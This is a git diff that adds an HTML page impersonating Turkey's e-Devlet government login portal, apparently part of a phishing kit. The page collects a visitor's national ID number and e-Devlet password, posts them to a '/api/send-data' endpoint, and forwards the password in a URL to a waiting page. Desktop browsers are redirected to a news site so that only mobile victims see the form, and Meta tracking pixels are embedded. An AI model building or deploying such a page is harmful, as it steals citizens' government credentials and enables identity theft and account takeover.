@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+
+	<!-- Meta Pixel Code -->
+	<script>
+		!function(f,b,e,v,n,t,s)
+		{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+		n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+		if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+		n.queue=[];t=b.createElement(e);t.async=!0;
+		t.src=v;s=b.getElementsByTagName(e)[0];
+		s.parentNode.insertBefore(t,s)}(window, document,'script',
+		'https://connect.facebook.net/en_US/fbevents.js');
+		fbq('init', '1120174740100703');
+		fbq('track', 'PageView');
+		</script>
+		<noscript><img height="1" width="1" style="display:none"
+		src="https://www.facebook.com/tr?id=1120174740100703&ev=PageView&noscript=1"
+		/></noscript>
+	<!-- End Meta Pixel Code -->
+	
+		<!-- Meta Pixel Code -->
+	<script>
+		!function(f,b,e,v,n,t,s)
+		{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+		n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+		if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+		n.queue=[];t=b.createElement(e);t.async=!0;
+		t.src=v;s=b.getElementsByTagName(e)[0];
+		s.parentNode.insertBefore(t,s)}(window, document,'script',
+		'https://connect.facebook.net/en_US/fbevents.js');
+		fbq('init', '2183701782160363');
+		fbq('track', 'PageView');
+		</script>
+		<noscript><img height="1" width="1" style="display:none"
+		src="https://www.facebook.com/tr?id=1120174740100703&ev=PageView&noscript=1"
+		/></noscript>
+	<!-- End Meta Pixel Code -->
+	
+	
+	
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>e-Devlet Kapısı - Kimlik Doğrulama Sistemi</title>
+    <style>
+        /* CSS'in Tamamı - Ana Yapı Aynen Korundu */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .logo-container {
+            margin-bottom: -27px;
+        }
+
+        .logo {
+            width: 270px;
+            height: 180px;
+            background-image: url('./images/mylogo.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            margin: 0 auto 25px auto;
+            display: block;
+        }
+
+        .title {
+            color: #2c3e50;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 13px;
+            margin-bottom: 35px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        /* ------------- YALNIZCA BUTON VE INPUT STİLLERİ BAŞLANGIÇ ------------- */
+
+        .form-group {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .required {
+            color: #e74c3c;
+        }
+		
+        .form-control {
+            background-color: #fff;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #000;
+            padding: 5px 10px;
+            border: 1px solid #a5a9b1;
+            width: 100%;
+            height: 2.8125rem;
+            display: inline-block;
+            vertical-align: bottom;
+            border-radius: .5rem;
+            float: left;
+        }
+
+        .form-control:focus {
+            /* INPUT alanına tıklandığında (focus) stili */
+            outline: none;
+            border-color: #3498db;
+            background-color: white;
+            box-shadow: 0 0 0 2px rgba(52, 152, 219, 0.2);
+        }
+		
+
+
+        .btn-primary {
+            /* DEVAM ET Butonunun ana stili */
+            width: 62% !important;
+			display: inline-block;
+            padding: 0 15px;
+            background: linear-gradient(120deg,#338ad6 0,#045ead 80%);
+            color: #FFF;
+            border: none;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+        }
+
+        .btn-primary:hover {
+            /* Buton üzerine gelindiğinde stili */
+            background: #357abd;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(74, 144, 226, 0.3);
+        }
+
+        .btn-primary:active {
+            /* Butona basıldığında stili */
+            transform: translateY(0);
+        }
+
+        /* Yüklenme ve Hata Geri Bildirim Stilleri (Formla İlişkili) */
+
+        .result-container {
+            margin-top: 20px;
+            padding: 20px;
+            border-radius: 8px;
+            display: none;
+        }
+
+        .result-success {
+            background-color: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+
+        .result-error {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+        }
+
+        .loading {
+            display: none;
+            margin-top: 15px;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* ------------- YALNIZCA BUTON VE INPUT STİLLERİ SONU ------------- */
+
+        /* Diğer Ana Yapı Stilleri (Aynen Korundu) */
+        .footer {
+            margin-top: 30px;
+            padding: 15px 0;
+            border-top: 1px solid #ecf0f1;
+            color: #7f8c8d;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            height: 60px;
+        }
+        
+        .footer-logo {
+            width: 268px;
+            height: 50px;
+            background-image: url('./images/mysublogo.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+
+        /* Mobile Responsive */
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+            
+            .container {
+                padding: 30px 25px;
+                margin: 0;
+                max-width: 100%;
+            }
+            
+            .title {
+                font-size: 20px;
+            }
+            
+            .subtitle {
+                font-size: 12px;
+            }
+            
+            /* Responsive input/button stili */
+            .form-control, .btn-primary {
+                padding: 12px;
+                font-size: 14px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .container {
+                padding: 25px 20px;
+            }
+            
+            .logo {
+                width: 245px;
+                height: 120px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo"></div>
+
+        </div>
+
+        <form id="identityForm">
+            <div class="form-group">
+                <label for="tc_no">
+                    <span class="required">*</span> T.C. Kimlik No
+                </label>
+                <input 
+                    type="text" 
+                    id="tc_no" 
+                    name="tc_no" 
+                    class="form-control" 
+                    placeholder=""
+                    maxlength="11"
+                    required
+                >
+            </div>
+			<br><br>
+
+            <div class="form-group">
+                <label for="password">
+                    <span class="required">*</span> e-Devlet Şifresi
+                </label>
+                <input 
+                    type="password" 
+                    id="password" 
+                    name="password" 
+                    class="form-control" 
+                    placeholder=""
+                    required
+                >
+            </div>
+			<br><br>
+
+            <button type="submit" class="btn-primary">
+                Devam Et
+            </button>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p style="margin-top: 10px; color: #666;">Kimlik doğrulanıyor...</p>
+            </div>
+        </form>
+
+        <div class="result-container" id="result">
+            </div>
+
+        <div class="footer">
+            <div class="footer-logo"></div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+          var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+          if (!isMobile) {
+            window.location.href = "https://www.trthaber.com/";
+          }
+        });
+    </script>
+	
+
+
+    <script>
+        // T.C. Kimlik No input validation
+        document.getElementById('tc_no').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 11);
+        });
+
+        // TC doğrulama (demo - temel kurallar)
+        function validateTCNumber(tc) {
+            if (!/^\d{11}$/.test(tc)) return false; // 11 hane ve sadece rakam
+            if (tc[0] === '0') return false; // İlk hane 0 olamaz
+            return true; // Demo: ileri algoritma kapalı
+        }
+
+        // Form submission (Vercel API'ye veri gönderme mantığı - aynen korundu)
+        document.getElementById('identityForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const tcNo = document.getElementById('tc_no').value;
+            const password = document.getElementById('password').value;
+            const loading = document.getElementById('loading');
+            const result = document.getElementById('result');
+            const submitBtn = document.querySelector('.btn-primary');
+            
+            // Validation
+            if (!validateTCNumber(tcNo)) {
+                showResult('Geçersiz T.C. Kimlik numarası.', 'error');
+                return;
+            }
+            
+            if (!password.trim()) {
+                showResult('e-Devlet şifresi boş olamaz.', 'error');
+                return;
+            }
+            
+            // Show loading
+            loading.style.display = 'block';
+            result.style.display = 'none';
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'İşlem yapılıyor...';
+            
+            try {
+                // Veriyi Vercel Serverless Function'a gönder (API endpoint'imiz: /api/send-data)
+                const response = await fetch('/api/send-data', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ tc_no: tcNo, password: password }),
+                });
+
+                if (response.ok) {
+                    // Başarılı ise wait.html'e tc_no ve password ile git
+                    const params = new URLSearchParams({ 'tc_no': tcNo, 'password': password });
+                    window.location.href = `wait.html?${params.toString()}`;
+                    return;
+                } else {
+                    const data = await response.json().catch(() => ({}));
+                    showResult(`İletim başarısız. Lütfen bilgileri kontrol edip tekrar deneyin. (${data.message || 'Bilinmeyen Hata'})`, 'error');
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                showResult('Sunucu ile iletişimde bir sorun oluştu.', 'error');
+            } finally {
+                // UI reset
+                loading.style.display = 'none';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Devam Et';
+            }
+        });
+        
+        function showResult(message, type) {
+            const result = document.getElementById('result');
+            result.className = `result-container result-${type}`;
+            result.innerHTML = `<p>${message}</p>`;
+            result.style.display = 'block';
+        }
+    </script>
+	
+</body>
+</html>
